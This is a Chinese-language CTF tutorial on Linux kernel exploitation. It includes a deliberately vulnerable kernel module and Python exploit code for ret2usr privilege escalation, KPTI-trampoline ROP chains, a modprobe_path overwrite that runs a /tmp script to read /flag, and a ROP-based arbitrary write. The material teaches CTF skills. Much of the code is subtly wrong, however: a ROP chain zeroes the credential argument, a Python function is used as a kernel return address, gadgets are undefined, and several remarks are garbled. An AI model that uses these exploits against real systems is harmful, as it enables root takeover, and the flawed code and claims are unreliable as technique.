---
category: "内核PWN"
tags: ["kernel", "LKM", "ret2usr", "KPTI", "KRWL", "modprobe_path", "cred"]
difficulty: "高级"
---

# 内核PWN基础：LKM/ret2usr/KPTI绕过/KRWL

## 1. 概述

内核PWN（Kernel Exploitation）是CTF中难度最高的方向之一，攻击目标是Linux内核模块（LKM）中的漏洞。与传统用户态PWN不同，内核PWN需要处理内核地址空间、特权级切换、以及KPTI/SMEP/SMAP等现代内核保护机制。

在CTF断网离线场景下，内核PWN依赖QEMU虚拟机+自编译内核镜像+busybox文件系统，需要熟悉内核调试环境搭建和漏洞利用流程。

## 2. 核心原理

### 2.1 用户态vs内核态

```
用户态 (Ring 3):
- 受限内存访问
- 通过系统调用进入内核
- 无法直接访问内核内存

内核态 (Ring 0):
- 完整内存访问
- 可修改任意进程的cred结构体
- 特权指令可用
```

### 2.2 内核Cred结构体

```c
struct cred {
    atomic_t    usage;
    kuid_t      uid;        // 用户ID
    kgid_t      gid;        // 组ID
    kuid_t      suid;       // saved uid
    kgid_t      sgid;       // saved gid
    kuid_t      euid;       // effective uid
    kgid_t      egid;       // effective gid
    // ... more ...
};

// 提权目标：将 uid, euid 等设为 0 (root)
// commit_creds(prepare_kernel_cred(0)) 是经典的提权序列
```

### 2.3 关键保护机制

| 保护 | 全称 | 作用 | 绕过方式 |
|------|------|------|---------|
| SMEP | Supervisor Mode Execution Prevention | 内核态不能执行用户态代码 | ROP/JOP 在内核空间执行 |
| SMAP | Supervisor Mode Access Prevention | 内核态不能随意访问用户态内存 | 暂时禁用CR4.SMAP |
| KPTI | Kernel Page Table Isolation | 内核页表不可见用户空间 | ret2user + signal handler |
| KASLR | Kernel ASLR | 内核地址随机化 | 泄露内核地址 |
| FG-KASLR | Function Granular KASLR | 函数级随机化 | commit_creds + prepare_kernel_cred 地址泄露 |
| modprobe_path | /sbin/modprobe 路径 | 内核执行elf时用的路径 | 覆写modprobe_path为自定义脚本 |

## 3. 关键技巧/检测方法

### 3.1 内核环境搭建

```bash
# 获取内核源码
wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.98.tar.xz

# 编译内核 - CTF场景用最小配置
make defconfig
# 开启调试
make menuconfig
# Kernel hacking -> Compile-time checks -> Compile the kernel with debug info
# Kernel hacking -> Generic Kernel Debugging -> KGDB: kernel debugger

# 编译
make -j$(nproc) bzImage

# 制作文件系统 (busybox)
git clone git://git.busybox.net/busybox
cd busybox && make defconfig && make menuconfig
# Settings -> Build static binary (no shared libs)
make -j$(nproc) && make install

# 打包文件系统
find . | cpio -o -H newc > ../rootfs.cpio
gzip ../rootfs.cpio

# 启动QEMU
qemu-system-x86_64 \
  -kernel linux-5.4.98/arch/x86/boot/bzImage \
  -initrd rootfs.cpio.gz \
  -append "console=ttyS0 nokaslr oops=panic" \
  -nographic -monitor /dev/null \
  -s  # GDB监听1234端口
```

### 3.2 内核模块一般结构

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

static int vuln_open(struct inode *inode, struct file *file) {
    return 0;
}

static ssize_t vuln_read(struct file *file, char __user *buf, size_t count, loff_t *pos) {
    char kbuf[0x100];
    // 漏洞点: 没有检查count大小
    copy_to_user(buf, kbuf, count);  // 栈信息泄露
    return count;
}

static ssize_t vuln_write(struct file *file, const char __user *buf, size_t count, loff_t *pos) {
    char kbuf[0x30];
    // 漏洞点: count未检查, 栈溢出
    copy_from_user(kbuf, buf, count);
    return count;
}

static struct file_operations vuln_fops = {
    .owner = THIS_MODULE,
    .read = vuln_read,
    .write = vuln_write,
    .open = vuln_open,
};

static int __init vuln_init(void) {
    register_chrdev(233, "vuln", &vuln_fops);
    return 0;
}

module_init(vuln_init);
module_exit(...);
MODULE_LICENSE("GPL");
```

### 3.3 内核地址泄露方法

```c
// 1. /proc/kallsyms (需要 root, CTF一般给)
// 2. /sys/kernel/notes (可能泄露内核地址)
// 3. 调试信息 .config /proc/config.gz
// 4. dmesg日志泄露
// 5. LKM自身的copy_to_user信息泄露
```

## 4. 常见误区与注意事项

1. **KPTI导致ret2user失效**：需要添加signal handler 或使用KPTI trampoline
2. **内核栈大小有限**：通常只8KB或16KB，ROP链不能太长
3. **copy_from_user会检查SMAP**：需要使用copy_from_user或禁用SMAP
4. **不能直接调用用户态函数**：需要通过ROP链或内核函数完成提权
5. **modprobe_path利用需要tmpfs可写**：且/sbin/modprobe等路径长度不能变化

## 5. 实战示例

### 5.1 ret2usr 基础利用（无KPTI/SMEP/SMAP）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ret2usr: 内核栈溢出，返回到用户态的提权函数
条件: 无SMEP, 无SMAP, 无KPTI, 已知commit_creds和prepare_kernel_cred地址
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# ---- 编译 exploit.c (用户态部分) ----
# gcc -static -masm=intel -o exploit exploit.c
# 或使用本脚本的 shellcraft

# 已知的内核符号地址（从题目/proc/kallsyms或提供的System.map）
commit_creds = 0xffffffff810a2840
prepare_kernel_cred = 0xffffffff810a2c30

# ---- 用户态提权函数 ----
def get_root_shell():
    """提权后获取root shell"""
    if os.getuid() == 0:
        log.success('Got root!')
        os.system('/bin/sh')
    else:
        log.error('Privilege escalation failed')

# ---- 提权rop链 ----
# 在内核空间执行: commit_creds(prepare_kernel_cred(0))
# 然后返回到用户态的 get_root_shell

user_rip = get_root_shell  # 返回用户态的函数地址
user_cs = 0x33  # 用户态代码段选择子 (64位)
user_rflags = 0x202  # EFLAGS
user_rsp = 0x7ff000  # 用户态栈
user_ss = 0x2b  # 用户态栈段选择子

# 用于iretq返回的栈布局
# iretq按顺序弹出: rip, cs, rflags, rsp, ss
# 可以通过 swapgs + iretq 返回; 但更简单的是直接 iretq

# 内核中ROP链
# 内核通常有以下gadget:
# pop rdi; ret  -> 用于设置参数
# xchg rax, rsp; ret  -> 用于栈迁移 (通常需要)

# 完整的内核ROP链:
rop_kernel = flat([
    # Step 1: prepare_kernel_cred(0)
    pop_rdi_ret, 0,
    prepare_kernel_cred,  # rax = new_cred

    # Step 2: commit_creds(new_cred)  
    # rax当前保存prepare_kernel_cred返回值
    # 需要 mov rdi, rax; 或 pop rdi; ret (如果有的话)
    # 如果没有 mov rdi, rax，需要找其他gadget
    pop_rdi_ret, 0,  # 这里假设直接跳到已经设置好rdi的情况
    commit_creds,

    # Step 3: 返回用户态 (iretq)
    # 需要: swapgs; iretq
    swapgs_iretq,
    0,  # 占位 (swapgs 不作为栈操作)
    user_rip,
    user_cs,
    user_rflags,
    user_rsp,
    user_ss,
])

# ---- 触发漏洞 ----
def exploit():
    p = process('./exploit')
    # 打开设备文件并触发溢出
    fd = os.open('/dev/vuln', os.O_RDWR)
    # 计算溢出偏移
    offset = 0x30 + 8  # 缓冲区 + saved rbp
    payload = b'A' * offset + rop_kernel
    os.write(fd, payload)
    os.close(fd)

exploit()
```

### 5.2 KPTI绕过（KPTI Trampoline）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KPTI绕过技术: 使用 KPTI Trampoline
由于KPTI隔离了用户页表，直接iretq到用户态会触发Page Fault
需要先swapgs以使用内核页表，然后跳到KPTI trampoline序列
"""
from pwn import *

context.arch = 'amd64'

# KPTI trampoline 是内核中 swapgs; iretq 之前的代码段
# 在 x86/entry/entry_64.S 中定义
# 通常需要找到偏移

# 传统方法 (__swapgs_restore_regs_and_return_to_usermode)
# 地址 = 内核基址 + offset
# 在 vmlinux 中搜索: "swapgs" + "iretq"

# 示例地址 (通用偏移,需根据实际内核调整)
# swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xa008f6

# ---- KPTI绕过 ROP链 ----
def kpti_bypass_rop(pop_rdi, commit_creds, prepare_kernel_cred,
                     kpti_trampoline, user_rip, user_cs, user_rflags, user_rsp, user_ss):
    """
    KPTI绕过: 使用内核的 standard KPTI 返回序列
    kpti_trampoline: swapgs; iretq 的地址
    """
    rop = flat([
        # Step 1: 提权
        pop_rdi, 0,
        prepare_kernel_cred,  # rax = prepare_kernel_cred(0)

        # 将 rax 转给 rdi
        # mov rdi, rax; jmp ... (需要特定gadget)
        # 或 pop rdx; mov rdi, rax; ...
        # 这里假设有合适gadget

        # Step 2: commit_creds
        commit_creds,

        # Step 3: KPTI trampoline
        kpti_trampoline,
        0,  # 栈占位 (Trampoline 会从这里继续pop)
        0,  # ...
        user_rip,
        user_cs,
        user_rflags,
        user_rsp,
        user_ss,
    ])
    return rop

# ---- Signal Handler 方式绕过KPTI ----
# 另一种绕过方式：不直接iretq，而是通过signal返回
# 当内核返回用户态时如果发生segfault，会调用用户态signal handler
# 在signal handler中完成后续操作
```

### 5.3 modprobe_path 覆写提权

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
modprobe_path 覆写提权技术
原理: 内核在执行未知格式的二进制时，会调用modprobe_path指定的程序
覆写modprobe_path为自定义脚本路径，触发执行即可提权

优势: 不需要复杂的ROP链，只需一次任意写
"""
from pwn import *

context.arch = 'amd64'

# ---- 利用流程 ----
def modprobe_path_exploit():
    """
    步骤:
    1. 获取modprobe_path地址 (内核基址 + 固定偏移)
    2. 通过漏洞实现任意地址写
    3. 覆写 modprobe_path 为 /tmp/x
    4. 创建 /tmp/x 脚本:
       #!/bin/sh
       chmod 777 /flag
       cp /flag /tmp/flag
       chmod 777 /tmp/flag
    5. 执行一个未知格式的二进制文件 (如: echo -ne "\xff\xff\xff\xff" > /tmp/evil; chmod +x /tmp/evil; /tmp/evil)
    6. 内核调用 modprobe_path -> /tmp/x -> 提权
    """

    # modprobe_path 的内核偏移 (各版本不同)
    # 在 init/do_mounts.c 或 kernel/kmod.c 中
    # ./scripts/gdb/linux/symbols.py
    # 或 grep "modprobe_path" /proc/kallsyms

    # 假设已知
    modprobe_path_addr = 0xffffffff82000000  # 示例

    # Step 1: 准备 /tmp/x 脚本
    with open('/tmp/x', 'w') as f:
        f.write('#!/bin/sh\n')
        f.write('chmod 777 /flag\n')
        f.write('cp /flag /tmp/flag\n')
        f.write('chmod 777 /tmp/flag\n')
    os.chmod('/tmp/x', 0o777)

    # Step 2: 通过漏洞覆写 modprobe_path
    # 目标: 将 modprobe_path 改为 "/tmp/x\x00"
    # 注意: 原来的modprobe_path可能是 "/sbin/modprobe\x00"
    # 长度限制: 不能超过原字符串长度 (通常是15字节)

    # 如果原路径是 /sbin/modprobe (15字节包括\x00)
    # 新路径 /tmp/x\x00\x00\x00\x00\x00... 长度 <= 15

    new_path = b'/tmp/x\x00' + b'\x00' * (15 - 7)
    # 使用任意写漏洞覆写

    # Step 3: 触发modprobe
    # 执行一个header magic invalid的ELF
    os.system('echo -ne "\\xff\\xff\\xff\\xff" > /tmp/evil')
    os.system('chmod +x /tmp/evil')
    try:
        os.system('/tmp/evil')  # 触发内核调用 /tmp/x
    except:
        pass

    # Step 4: 读取flag
    with open('/tmp/flag', 'r') as f:
        flag = f.read()
    log.success(f'Flag: {flag}')

# ---- 任意地址写实现 (通过栈溢出) ----
def arbitrary_write(addr, data):
    """通过内核栈溢出实现任意地址写"""
    fd = os.open('/dev/vuln', os.O_RDWR)

    offset = 0x40 + 8

    # ROP链: copy_from_user(addr, user_buf, len)
    # 或使用内核的 memcpy 等
    # 示例: 利用已有gadget完成

    pop_rdi_ret = 0xffffffff81001234
    pop_rsi_ret = 0xffffffff81005678
    pop_rdx_ret = 0xffffffff8100abcd
    copy_from_user = 0xffffffff81034567

    user_buf_addr = 0x601000  # 用户态缓冲区

    # 将数据写入用户态缓冲区
    # memcpy(user_buf_addr, data, len(data))

    payload = b'A' * offset
    payload += p64(pop_rdi_ret) + p64(addr)
    payload += p64(pop_rsi_ret) + p64(user_buf_addr)
    payload += p64(pop_rdx_ret) + p64(len(data))
    payload += p64(copy_from_user)

    os.write(fd, payload)
    os.close(fd)

modprobe_path_exploit()
```

### 5.4 内核调试脚本（GDB连接QEMU）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
内核调试自动化脚本
通过GDB连接QEMU的内核调试端口
"""
from pwn import *

# ---- 启动QEMU ----
def start_qemu():
    """启动带有调试端口的QEMU"""
    qemu_cmd = [
        'qemu-system-x86_64',
        '-kernel', './bzImage',
        '-initrd', './rootfs.cpio.gz',
        '-append', 'console=ttyS0 nokaslr oops=panic',
        '-nographic',
        '-monitor', '/dev/null',
        '-s',  # GDB server port 1234
        '-S',  # 启动时暂停 (等待GDB连接)
        '-cpu', 'kvm64,+smep,+smap',  # 显式设置保护
    ]
    return process(' '.join(qemu_cmd), shell=True)

# ---- GDB脚本 ----
gdb_script = """
# 连接远程目标
target remote :1234

# 加载内核符号
add-symbol-file ./vmlinux

# 设置断点
b *0xffffffff81123456

# 继续执行
c
"""

# ---- 自动化调试 ----
def debug_kernel():
    qemu = start_qemu()
    sleep(2)  # 等待QEMU启动

    gdb.attach(target=('localhost', 1234), gdbscript=gdb_script)

    qemu.interactive()

# ---- 内核ROPgadget ----
# 在内核镜像中搜索gadget
# ROPgadget --binary ./vmlinux --all > kernel_gadgets.txt
# 注意: vmlinux 非常大，gadget搜索可能很慢

# 常用内核gadget特征
def find_kernel_gadgets(vmlinux_path):
    """在内核中手动搜索常用gadget"""
    elf = ELF(vmlinux_path)

    # 关键函数地址
    symbols = {
        'commit_creds': elf.symbols.get('commit_creds'),
        'prepare_kernel_cred': elf.symbols.get('prepare_kernel_cred'),
        'swapgs_restore_regs_and_return_to_usermode': None,
        'modprobe_path': None,
    }

    # 搜索 modprobe_path 字符串
    for section in elf.sections:
        if section.name == '.rodata' or section.name == '.data':
            data = section.data()
            idx = data.find(b'/sbin/modprobe')
            if idx != -1:
                symbols['modprobe_path'] = section.header.sh_addr + idx
                break

    return symbols

debug_kernel()
```

## 6. 相关知识点

- **保护机制绕过**：SMEP/SMAP/KPTI/KASLR对应的用户态打法，见 12-保护机制与绕过.md
- **ROP链构造**：内核ROP与用户态ROP原理相同但gadget不同，见 02-ROP链构造技术.md
- **内核编译**：熟悉Linux内核编译流程和配置选项
- **QEMU调试**：QEMU的 `-s` 和 `-S` 参数，GDB远程调试协议
- **内核版本**：不同版本的内核API和保护机制差异显著，需针对性准备
